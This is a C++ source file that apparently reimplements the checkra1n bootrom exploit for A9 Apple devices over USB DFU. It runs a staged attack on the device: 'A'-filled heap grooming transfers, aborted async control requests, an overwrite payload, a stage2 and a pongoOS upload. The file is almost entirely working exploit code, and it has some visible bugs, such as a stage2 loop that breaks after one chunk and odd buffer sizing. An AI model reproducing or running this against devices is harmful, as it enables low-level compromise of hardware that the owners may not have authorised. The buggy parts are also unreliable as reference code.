#include <assert.h>
#include <fcntl.h>
#include <fstream>
#include <iostream>
#include <iterator>
#include <stdio.h>
#include <vector>
#include <inttypes.h>
#include <algorithm>

#ifdef _WIN32
#include <windows.h>
#elif _POSIX_C_SOURCE >= 199309L
#include <time.h> // for nanosleep
#else
#include <unistd.h> // for usleep
#endif

using namespace std;

#include "dfu.h"

void sleep_ms(int milliseconds) // cross-platform sleep function
{
#ifdef WIN32
  Sleep(milliseconds);
#elif _POSIX_C_SOURCE >= 199309L
  struct timespec ts;
  ts.tv_sec = milliseconds / 1000;
  ts.tv_nsec = (milliseconds % 1000) * 1000000;
  nanosleep(&ts, NULL);
#else
  usleep(milliseconds * 1000);
#endif
}

typedef struct {
    void* over1;
    unsigned int over1_len;
    void* over2;
    unsigned int over2_len;
    void* stage2;
    unsigned int stage2_len;
    void* pongoOS;
    unsigned int pongoOS_len;
} checkra1n_payload_t;
checkra1n_payload_t payload;

int open_file(const char* file, unsigned int* sz, void** buf) {
    FILE* fd = fopen(file, "r");
    if (!fd) {
        printf("error opening %s\n", file);
        return -1;
    }

    fseek(fd, 0, SEEK_END);
    *sz = ftell(fd);
    fseek(fd, 0, SEEK_SET);

    free(*buf);
    *buf = calloc(*sz, sizeof(void*));
    if (!*buf) {
        printf("error allocating file buffer\n");
        fclose(fd);
        return -1;
    }

    fread(*buf, *sz, 4, fd);
    fclose(fd);

    return 0;
}

int payload_stage2(DFU D, checkra1n_payload_t payload) {
    //transfer_t result;
    size_t len = 0;
    size_t size;
    while (len < payload.stage2_len) {
        size = ((payload.stage2_len - len) > 0x800) ? 0x800 : (payload.stage2_len - len);
        int sendResult = D.libusb1_no_error_ctrl_transfer(0x21, 1, 0, 0, (unsigned char*)&((uint8_t*)(payload.stage2))[len], 2032, 0);
        len += size;
        break;
    }
    sleep_ms(1);

    D.libusb1_no_error_ctrl_transfer(0x21, 4, 0, 0, 0, 0, 0);
    sleep_ms(1);

    return 0;
}

int pongo(DFU D, checkra1n_payload_t payload)
{
    unsigned char blank[8];
    memset(&blank, '\0', 8);

    D.libusb1_no_error_ctrl_transfer(0x40, 64, 0x03e8, 0x01f4, 0, 0, 0);

    size_t len = 0;
    size_t size;

    while (len < payload.pongoOS_len) {
        size = ((payload.pongoOS_len - len) > 0x800) ? 0x800 : (payload.pongoOS_len - len);
        D.libusb1_no_error_ctrl_transfer(0x21, 1, 0, 0, (unsigned char*)&((uint8_t*)(payload.pongoOS))[len], size, 0);
        len += size;
    }

    D.libusb1_no_error_ctrl_transfer(0x21, 1, 0, 0, 0, 0, 0);
    D.libusb1_no_error_ctrl_transfer(0xa1, 3, 0, 0, blank, 8, 0);
    D.libusb1_no_error_ctrl_transfer(0xa1, 3, 0, 0, blank, 8, 0);
    D.libusb1_no_error_ctrl_transfer(0xa1, 3, 0, 0, blank, 8, 0);

    return 0;
}


void checkra1n_A9()
{
    memset(&payload, '\0', sizeof(checkra1n_payload_t));
    if (open_file(".\\s8003_overwrite2", &payload.over1_len, &payload.over1) != 0) exit(1);
    if (open_file(".\\s8003_overwrite2", &payload.over2_len, &payload.over2) != 0) exit(1);
    if (open_file(".\\s8003_stage2", &payload.stage2_len, &payload.stage2) != 0) exit(1);
    if (open_file(".\\s8003_pongoOS", &payload.pongoOS_len, &payload.pongoOS) != 0) exit(1);

    DFU D;
    if (!D.acquire_device())
    {
        printf("[!] Failed to find device!\n");
        return;
    }

    printf("[*] stage 1, reconnecting\n");
    D.usb_reset();
    D.release_device();

    sleep_ms(500);

    printf("[*] stage 2, usb setup, send 0x800 of 'A', sends no data\n");
    D.acquire_device();
    unsigned char blank[2048];
    memset(blank, 0, 2048);
    D.libusb1_no_error_ctrl_transfer(0x21, 1, 0, 0, blank, 2048, 0);
    D.usb_reset();
    D.release_device();

    unsigned char AAAA[2048];
    memset(AAAA, 'A', 2048);
    D.acquire_device();
    std::vector<uint8_t> A800;
    A800.insert(A800.end(), 0x800, 'A');
    D.libusb1_async_ctrl_transfer(0x21, 1, 0, 0, A800, 0.002);
    //?! idk why it just increase success rate
    D.libusb1_no_error_ctrl_transfer(0, 0, 0, 0, AAAA, 64, 0);

    D.libusb1_no_error_ctrl_transfer(0, 0, 0, 0, AAAA, 704, 100);
    D.libusb1_no_error_ctrl_transfer(0x21, 4, 0, 0, 0, 0, 0);
    D.release_device();

    printf("[*] stage 3, send payload overwrite2\n");
    sleep_ms(500);
    D.acquire_device();\
    D.libusb1_no_error_ctrl_transfer(0, 0, 0, 0, (unsigned char*)&((uint8_t*)(payload.over2))[0], payload.over2_len, 100);
    printf("[*] 여기서부터 오랫동안 멈춘다면 DFU 모드에 다시 진입하고 재시도하세요.\n");
    D.libusb1_no_error_ctrl_transfer(0x21, 4, 0, 0, 0, 0, 0);
    D.release_device();

    printf("[*] stage 4, send payload stage2\n");
    sleep_ms(500);
    D.acquire_device();
    payload_stage2(D, payload);

    printf("[*] stage 5, send pongoOS\n");
    D.usb_reset();
    D.release_device();
    D.idProduct = 0x1338;
    sleep_ms(5000);
    D.acquire_device();
    pongo(D, payload);
    D.usb_reset();
    D.release_device();
}


void runCheckra1n()
{
  DFU D;
  if (!D.acquire_device())
  {
    printf("[!] Failed to find device!\n");
    return;
  }

  auto serial = D.getSerialNumber();
  D.release_device();

  cout << "[*] serial: " << serial << endl;

  if (serial.find("CPID:8000") != string::npos ||
      serial.find("CPID:8003") != string::npos)
      checkra1n_A9();
}



int main(int argc, char *argv[])
{
  runCheckra1n();
  return 0;
}